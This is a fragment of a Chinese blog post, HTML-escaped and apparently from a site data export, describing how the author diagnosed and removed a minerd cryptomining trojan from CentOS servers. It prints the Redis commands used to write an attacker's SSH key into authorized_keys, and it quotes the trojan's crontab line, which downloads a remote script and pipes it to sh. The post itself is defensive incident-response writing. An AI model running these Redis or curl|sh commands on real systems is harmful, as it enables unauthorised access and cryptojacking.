alt=\"4.jpg\"><br>5&#x3001;&#x90A3;&#x4E48;&#x662F;&#x5199;&#x8FDB;&#x6765;authorized_keys&#x7684;&#x90A3;&#xFF1F;</p>\n<p>&#x4E4B;&#x524D;&#x6211;&#x5904;&#x7406;&#x8FC7;&#x7C7B;&#x4F3C;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x662F;redis&#x672A;&#x6388;&#x6743;&#x5BFC;&#x81F4;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5916;&#x7F51;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0D;&#x7528;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x6211;&#x7684;redis, &#x8FDE;&#x4E0A;redis&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x547D;&#x4EE4;&#x5373;&#x53EF;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#xFF1A;</p>\n<font style=\"color:red\"><strong>config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>set key value&#xFF0C;&#x5176;&#x4E2D;value&#x4E3A;&#x751F;&#x6210;&#x516C;&#x94A5;&#xFF0C;&#x5373;&#x53EF;&#x5C06;&#x516C;&#x94A5;&#x4FDD;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F7F;&#x5F97;&#x767B;&#x5F55;&#x65F6;&#x4E0D;&#x9700;&#x8981;&#x8F93;&#x5165;&#x8D26;&#x53F7;&#x4E0E;&#x5BC6;&#x7801;&#x3002;</strong></font>\n\n<p><br></p>\n<hr>\n<h2 id=\"&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;\"><a href=\"#&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;\" class=\"headerlink\" title=\"&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;\"></a>&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;</h2><p>1&#x3001;&#x4FEE;&#x6539;ssh&#x7AEF;&#x53E3;<br>&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;Port 22&#x5C06;22&#x4FEE;&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x7AEF;&#x53E3;</p>\n<p>2&#x3001;&#x7981;&#x6B62;root&#x7528;&#x6237;&#x767B;&#x9646;<br>&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;PermitRootLogin &#x4FEE;&#x6539;&#x4E3A;no</p>\n<p>3&#x3001;&#x4FEE;&#x6539;&#x65E0;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;<br>&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;AuthorizedKeysFile &#x4FEE;&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;</p>\n<p>4&#x3001;&#x5220;&#x9664; .ssh&#x4E0B;&#x7684; KHK75NEOiq</p>\n<p>5&#x3001;&#x4E0D;&#x8BA9;&#x5916;&#x7F51;&#x76F4;&#x63A5;&#x8FDE;&#x63A5;<br>&#x5728; redis.conf &#x6587;&#x4EF6;&#x4E2D;&#x627E;&#x5230;#bind 127.0.0.1&#xFF0C;&#x628A;&#x524D;&#x9762;&#x7684;#&#x53F7;&#x53BB;&#x6389;&#xFF0C;&#x91CD;&#x542F;</p>\n<hr>\n<h2 id=\"&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;\"><a href=\"#&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;\" class=\"headerlink\" title=\"&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;\"></a>&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;</h2><p>1&#x3001;&#x901A;&#x5E38;&#x76F4;&#x63A5;kill&#x6389;&#x8FDB;&#x7A0B;&#xFF0C;&#x662F;&#x4E0D;&#x597D;&#x4F7F;&#x7684;&#xFF0C;&#x80AF;&#x5B9A;&#x6709;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x8FD8;&#x6709;&#x7CFB;&#x7EDF;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x6240;&#x4EE5;&#x6E05;&#x7406;&#x6B65;&#x9AA4;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br>1&#xFF09;&#x5E72;&#x6389;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;<br>2&#xFF09;&#x5E72;&#x6389;&#x7CFB;&#x7EDF;&#x81EA;&#x542F;&#x52A8;<br>3&#xFF09;&#x5E72;&#x6389;&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;</p>\n<p>&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x5E76;&#x5E72;&#x6389;</p>\n<p>&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x6709;&#x5927;&#x6982;&#x6709;&#x4E24;&#x79CD;&#x5B58;&#x5728;&#x5F62;&#x5F0F;&#xFF0C;crontab &#x548C;&#x5E38;&#x9A7B;&#x8FDB;&#x7A0B;&#xFF0C;&#x5E38;&#x9A7B;&#x8FDB;&#x7A0B;&#x5F97;&#x6162;&#x6162;&#x5206;&#x6790;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x770B;crontab&#xFF0C;&#x6709;&#x4E00;&#x6761;&#x4E0D;&#x662F;&#x6211;&#x521B;&#x5EFA;&#x7684;&#x4EFB;&#x52A1;&#x3002;&#x4EFB;&#x52A1;&#x662F;&#xFF1A;&#x76F4;&#x63A5;&#x4ECE;&#x8FDC;&#x7A0B;&#x4E0B;&#x8F7D;&#x4E00;&#x4E2A;&#x811A;&#x672C;pm.sh &#x5E76;&#x6267;&#x884C;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/5.jpg\" alt=\"5.jpg\"></p>\n<p>2&#x3001;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x811A;&#x672C;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/6.jpg\" alt=\"6.jpg\"></p>\n<p>3&#x3001;&#x5927;&#x81F4;&#x903B;&#x8F91;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br>1&#xFF09;&#x628A; <em>/10 </em> <em> </em> * curl -fsSL <a href=\"http://r.chanstring.com/pm.sh?0706\" target=\"_blank\" rel=\"external\">http://r.chanstring.com/pm.sh?0706</a> | sh &#x5199;&#x5165;crontab<br>2&#xFF09;&#x628A;authorized_keys&#x5220;&#x6389;&#xFF0C;&#x5E76;&#x521B;&#x5EFA;&#x514D;&#x767B;&#x5F55;&#x6587;&#x4EF6;/root/.ssh/KHK75NEOiq&#xFF0C;&#x4FEE;&#x6539;ssh&#x914D;&#x7F6E;&#x91CD;&#x542F;<br>3&#xFF09;curl&#x4E0B;&#x8F7D;/opt/KHK75NEOiq33 &#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5B89;&#x88C5;&#xFF08;/opt/KHK75NEOiq33 &#x2013;Install&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x542F;&#x52A8;ntp</p>\n<p>4&#x3001;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x65AD;&#x5B9A;&#x8FD9;&#x4E2A;ntp&#x5C31;&#x662F;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x4F46;&#x770B;&#x5230;ntp&#x771F;&#x7684;&#x6709;&#x4E9B;&#x6015;&#x6015;&#xFF0C;ntp&#x4E0D;&#x662F;&#x641E;&#x65F6;&#x95F4;&#x540C;&#x6B65;&#x7684;&#x5417;&#xFF0C;&#x5176;&#x5B9E; Linux&#x6B63;&#x5E38;&#x7684;ntp&#x670D;&#x52A1;&#x53EB;ntpd&#xFF0C;&#x5E76;&#x975E;ntp&#xFF0C;&#x5F88;&#x6709;&#x8FF7;&#x60D1;&#x6027;&#x554A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/7.jpg\" alt=\"7.jpg\"></p>\n<p>5&#x3001;&#x4F46;&#x4E3A;&#x4E86;&#x8BA9;&#x81EA;&#x5DF1;&#x653E;&#x5FC3;&#xFF0C;&#x8FD8;&#x662F;&#x6821;&#x9A8C;&#x4E86;&#x4E00;&#x756A;<br>&#x6211;&#x4EEC;&#x5148;&#x4ECE;&#x65F6;&#x95F4;&#x4E0A;&#x6821;&#x9A8C;&#xFF0C;ntp&#x662F;&#x4E0D;&#x662F;&#x6728;&#x9A6C;&#x4EFB;&#x52A1;&#x540E;&#x521B;&#x5EFA;&#x7684;</p>\n<p>&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x6728;&#x9A6C;&#x4EFB;&#x52A1;&#x7B2C;&#x4E00;&#x6B21;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;<br>&#x53BB;/var/log&#x4E0B;&#x770B;cron&#x7684;&#x65E5;&#x5FD7;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/8.jpg\" alt=\"8.jpg\"></p>\n<p>6&#x3001;Jul 24 09:23:01 &#x7B2C;&#x4E00;&#x6B21;&#x6267;&#x884C;&#xFF1A; curl -L <a href=\"http://r.chanstring.com/pm.sh?0703\" target=\"_blank\" rel=\"external\">http://r.chanstring.com/pm.sh?0703</a><br>Jul 24 09:30:01 &#x7B2C;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x76EE;&#x524D;crontab&#x91CC;&#x7684;&#x4EFB;&#x52A1;&#xFF1A;curl -fsSL <a href=\"http://r.chanstring.com/pm.sh?0706\" target=\"_blank\" rel=\"external\">http://r.chanstring.com/pm.sh?0706</a><br>Jul 24 09:49 &#x811A;&#x672C;/etc/init.d/ntp&#x7684;&#x521B;&#x5EFA;&#x65F6;&#x95F4;</p>\n<p>&#x4ECE;pm.sh&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x53EF;&#x77E5; curl&#x4E0B;&#x6765;/opt/KHK75NEOiq33&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5B89;&#x88C5; /opt/KHK75NEOiq33 &#x2013;Install &#x6BD4;&#x8F83;&#x8017;&#x65F6;&#x95F4;&#xFF0C;&#x6211;&#x6267;&#x884C;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x5728;&#x6211;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x662F;10&#x591A;&#x5206;&#x949F;&#x3002;</p>\n<p>&#x6240;&#x4EE5;&#x521B;&#x5EFA;&#x65F6;&#x95F4;&#x4E0A;&#x57FA;&#x672C;&#x543B;&#x5408;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/9.jpg\" alt=\"9.jpg\"></p>\n<p>7&#x3001;&#x6211;&#x4EEC;&#x770B;&#x4E00;&#x4E0B;ntp&#x7684;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;<br>runlevel 2 3 4 5&#x90FD;&#x542F;&#x52A8;&#x4E86;&#xFF0C;&#x591F;&#x72E0;&#x7684;&#x5440;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/10.jpg\" alt=\"10.jpg\"></p>\n<p>8&#x3001;&#x770B;&#x4E00;&#x4E0B;&#x5E38;&#x7528;&#x7684;3&#x5427;<br>&#x53EF;&#x4EE5;&#x770B;&#x5230; &#x6709;&#x4E2A;S50ntp &#x8F6F;&#x94FE;&#x4E86;&#x811A;&#x672C;/etc/init.d/ntp</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/11.jpg\" alt=\"11.jpg\"></p>\n<p>9&#x3001;&#x6211;&#x4EEC;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x65E5;&#x5FD7;<br>vim /var/log/boot.log<br>&#x6709;&#x4E00;&#x6761;&#x662F;Staring S50ntp&#xFF0C;&#x8FD9;&#x4E2A;&#x57FA;&#x672C;&#x5BF9;&#x5E94;&#x811A;&#x672C;/etc/init.d/ntp &#x4E2D;&#x7684; echo &#x201C;Starting $name&#x201D;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/12.jpg\" alt=\"12.jpg\"></p>\n<p>10&#x3001;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x4E00;&#x4E0B; /etc/init.d/ntp &#x8FD9;&#x4E2A;&#x811A;&#x672C;<br>$name&#x5E94;&#x8BE5;&#x5C31;&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x662F; S50ntp&#xFF0C;&#x901A;&#x8FC7;stdout_log,stderr_log,pid_file&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x9A8C;&#x8BC1;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/13.jpg\" alt=\"13.jpg\"></p>\n<p>11&#x3001;&#x901A;&#x8FC7;&#x641C;&#x7D22;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#xFF08;/opt/KHK75NEOiq33&#xFF09;&#xFF0C;&#x53EF;&#x77E5;&#x770B;&#x5230; /opt/KHK75NEOiq33 &#x2013;Install&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x5199;&#x5165;&#x4E86;ntp&#x811A;&#x672C; &#x81EA;&#x542F;&#x52A8; /opt/minerd&#x7B49;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/14.jpg\" alt=\"14.jpg\"></p>\n<p>12&#x3001;&#x6253;&#x5F00; /usr/local/etc/minerd.conf&#xFF0C;&#x5185;&#x5BB9;&#x5C31;&#x662F;/opt/minerd&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x540E;&#x7684;&#x4E00;&#x4E9B;&#x53C2;&#x6570;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/15.jpg\" alt=\"15.jpg\"></p>\n<p>13&#x3001;&#x597D;&#x4E86; &#x9A8C;&#x8BC1;&#x5B8C;&#x6BD5;&#xFF0C;&#x53EF;&#x4EE5;&#x5E72;&#x6389;&#x8FD9;&#x4E2A;ntp&#x4E86;</p>\n<hr>\n<h2 id=\"&#x6E05;&#x7406;&#x6728;&#x9A6C;\"><a href=\"#&#x6E05;&#x7406;&#x6728;&#x9A6C;\" class=\"headerlink\" title=\"&#x6E05;&#x7406;&#x6728;&#x9A6C;\"></a>&#x6E05;&#x7406;&#x6728;&#x9A6C;</h2><p>1&#x3001;&#x53BB;&#x6389;crontab&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6709;&#x5173;&#x6728;&#x9A6C;&#x5185;&#x5BB9;&#xFF1A;<br>/var/spool/cron/crontabs/root<br>/var/spool/cron/root</p>\n<p>2&#x3001;&#x5E72;&#x6389;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;ntp&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x76F8;&#x5173;&#x6587;&#x4EF6;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/16.jpg\" alt=\"16.jpg\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/17.jpg\" alt=\"17.jpg\"></p>\n<p>3&#x3001;&#x5E72;&#x6389;&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;&#x53CA;&#x5176;&#x6587;&#x4EF6;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/18.jpg\" alt=\"18.jpg\"></p>\n<p>4&#x3001;&#x5E72;&#x6389;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x53CA;&#x514D;&#x5BC6;&#x767B;&#x5F55;&#x7684;&#x6587;&#x4EF6;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/19.jpg\" alt=\"19.jpg\"></p>\n<p>5&#x3001;&#x5E72;&#x6389;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x7684;&#x6587;&#x4EF6;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/20.jpg\" alt=\"20.jpg\"></p>\n<p>6&#x3001;top&#x4E00;&#x4E0B; &#x4E00;&#x5207;&#x90FD;&#x6B63;&#x5E38;&#x4E86;&#xFF01;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/21.jpg\" alt=\"21.jpg\"></p>\n<p>7&#x3001;&#x91CD;&#x542F;&#x4E00;&#x4E0B;&#xFF0C;&#x4E5F;&#x6CA1;&#x95EE;&#x9898;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/22.jpg\" alt=\"22.jpg\"></p>\n","excerpt":"<blockquote>\n<p>&#x524D;&#x51E0;&#x5929;&#xFF0C;&#x516C;&#x53F8;&#x4E24;&#x53F0;linux&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E00;&#x53F0;&#x8BBF;&#x95EE;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;cpu&#x8DD1;&#x6EE1;&#xFF0C;&#x4E00;&#x53F0;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x5931;&#x6548;&#xFF0C;&#x516C;&#x94A5;&#x6587;&#x4EF6;&#x88AB;&#x6539;&#x5199;&#x6210;redis&#x7684;key&#x3002;&#x7528;htop&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x53D1;&#x73B0;&#x4E86;minerd&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;&#xFF0C;&#x521D;&#x6B65;&#x731C;&#x6D4B;&#x662F;redis&#x6CA1;&#x6709;&#x914D;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x9020;&#x6210;&#x7684;&#x3002;&#x7F51;&#x4E0A;&#x67E5;&#x8BE2;minerd&#x6728;&#x9A6C;&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5E38;&#x89C1;&#x7684;&#x6316;&#x77FF;&#x7A0B;&#x5E8F;&#xFF0C;&#x76F8;&#x5173;&#x731C;&#x6D4B;&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x9A8C;&#x8BC1;&#x3002;</p>\n</blockquote>\n<p>&#x4E0B;&#x6587;&#x662F;&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x5230;&#x7684;&#x6E05;&#x9664;minerd&#x6728;&#x9A6C;&#x65B9;&#x6CD5;&#x3002;</p>\n<h2 id=\"&#x73B0;&#x72B6;&#x63CF;&#x8FF0;\"><a href=\"#&#x73B0;&#x72B6;&#x63CF;&#x8FF0;\" class=\"headerlink\" title=\"&#x73B0;&#x72B6;&#x63CF;&#x8FF0;\"></a>&#x73B0;&#x72B6;&#x63CF;&#x8FF0;</h2><p>1&#x3001;top&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x8FD9;&#x4E2A;minerd &#x7A0B;&#x5E8F;&#x628A;cpu&#x8DD1;&#x6EE1;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/1.jpg\" alt=\"1.jpg\"><br>2&#x3001;ps aux | grep minerd<br>&#x53EF;&#x77E5;&#x662F;&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;: /opt/minerd</p>","more":"<p>&#x8FD9;&#x4E2A;&#x4E0D;&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x65AD;&#x5B9A;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E86;<br>&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x662F;root&#x7528;&#x6237;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x4EE3;&#x7801;&#x6709;&#x6F0F;&#x6D1E;&#x53EF;&#x80FD;&#x6027;&#x4E0D;&#x5927;&#xFF08;web&#x670D;&#x52A1;&#x662F;www&#x7528;&#x6237;&#x542F;&#x52A8;&#x7684;&#xFF09;&#xFF0C;&#x591A;&#x534A;&#x9ED1;&#x5BA2;&#x5DF2;&#x7ECF;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/2.jpg\" alt=\"2.jpg\"><br>3&#x3001;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x514D;&#x5BC6;&#x767B;&#x5F55;&#x4E86;&#xFF0C;&#x53BB;/root/.ssh &#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0;authorized_keys&#xFF0C;&#x4F46;&#x53D1;&#x73B0;&#x4E86;KHK75NEOiq&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;</p>\n<p>&#x67E5;&#x770B; vim KHK75NEOiq<br>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5185;&#x5BB9;&#x5C31;&#x662F;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x7684;&#x516C;&#x94A5;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/3.jpg\" alt=\"3.jpg\"><br>4&#x3001;&#x5728;ssh&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/ssh/sshd_config&#x4E2D;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x628A;AuthorizedKeysFile&#x6307;&#x5411;&#x4E86;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E86;&#xFF08;.ssh/KHK75NEOiq&#xFF09;</p>\n<p>&#x731C;&#x60F3;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;&#x901A;&#x8FC7;authorized_keys&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x5728;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E86;KHK75NEOiq&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;AuthorizedKeysFile&#x7684;&#x6307;&#x5411;&#xFF0C;&#x5C31;&#x628A;authorized_keys&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5220;&#x9664;&#x4E86;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/4.jpg\" alt=\"4.jpg\"><br>5&#x3001;&#x90A3;&#x4E48;&#x662F;&#x5199;&#x8FDB;&#x6765;authorized_keys&#x7684;&#x90A3;&#xFF1F;</p>\n<p>&#x4E4B;&#x524D;&#x6211;&#x5904;&#x7406;&#x8FC7;&#x7C7B;&#x4F3C;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x662F;redis&#x672A;&#x6388;&#x6743;&#x5BFC;&#x81F4;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5916;&#x7F51;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0D;&#x7528;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x6211;&#x7684;redis, &#x8FDE;&#x4E0A;redis&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x547D;&#x4EE4;&#x5373;&#x53EF;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#xFF1A;</p>\n<font style=\"color:red\"><strong>config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>set key value&#xFF0C;&#x5176;&#x4E2D;value&#x4E3A;&#x751F;&#x6210;&#x516C;&#x94A5;&#xFF0C;&#x5373;&#x53EF;&#x5C06;&#x516C;&#x94A5;&#x4FDD;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F7F;&#x5F97;&#x767B;&#x5F55;&#x65F6;&#x4E0D;&#x9700;&#x8981;&#x8F93;&#x5165;&#x8D26;&#x53F7;&#x4E0E;&#x5BC6;&#x7801;&#x3002;</strong></font>\n\n<p><br></p>\n<hr>\n<h2 id=\"&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;\"><a href=\"#&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;\" class=\"headerlink\" title=\"&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;\"></a>&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;</h2><p>1&#x3001;&#x4FEE;&#x6539;ssh&#x7AEF;&#x53E3;<br>&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;Port 22&#x5C06;22&#x4FEE;&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x7AEF;&#x53E3;</p>\n<p>2&#x3001;&#x7981;&#x6B62;root&#x7528;&#x6237;&#x767B;&#x9646;<br>&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;PermitRootLogin &#x4FEE;&#x6539;&#x4E3A;no</p>\n<p>3&#x3001;&#x4FEE;&#x6539;&#x65E0;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;<br>&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;AuthorizedKeysFile &#x4FEE;&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;</p>\n<p>4&#x3001;&#x5220;&#x9664; .ssh&#x4E0B;&#x7684; KHK75NEOiq</p>\n<p>5&#x3001;&#x4E0D;&#x8BA9;&#x5916;&#x7F51;&#x76F4;&#x63A5;&#x8FDE;&#x63A5;<br>&#x5728; redis.conf &#x6587;&#x4EF6;&#x4E2D;&#x627E;&#x5230;#bind 127.0.0.1&#xFF0C;&#x628A;&#x524D;&#x9762;&#x7684;#&#x53F7;&#x53BB;&#x6389;&#xFF0C;&#x91CD;&#x542F;</p>\n<hr>\n<h2 